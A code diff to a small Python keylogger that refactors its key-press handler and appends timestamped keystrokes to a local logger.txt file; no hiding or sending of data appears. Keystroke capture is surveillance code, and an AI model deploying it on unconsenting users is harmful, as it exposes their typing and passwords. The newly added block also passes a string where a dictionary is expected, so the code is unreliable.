@@ -13,12 +13,13 @@ def on_press(key):
             print(time + '\n' + '  ' + value)
 
     if pressed_keys[-1] == 'Key.space' or pressed_keys[-1] == 'Key.enter' or pressed_keys[-1]=='Key.esc':
-        log_dict(pressed_keys)
+        logger(pressed_keys)
         pressed_keys = []
 
-def log_dict(keys):
+def logger(keys):
     global log_dict
     ct = datetime.datetime.now()
+    global now
     now = ct.strftime("%d-%m-%y %H:%M ")
 
     data_str = ''
@@ -42,12 +43,18 @@ def log_dict(keys):
         log_dict[now] = data_str
         print(log_dict)
     write_file(log_dict)
-    log_dict = {}
+
 
 def write_file(log_dict):
     with open('logger.txt', 'a') as f:
         for key, value in log_dict.items():
             f.write(key + '\n' + '  ' + value + '\n')
+
+if len(log_dict) > 1:
+    not_now = list(log_dict.keys())[-2]
+    write_file(log_dict[not_now])
+    log_dict.popitem()
+
 
 def on_release(key):
     if key == Key.esc:
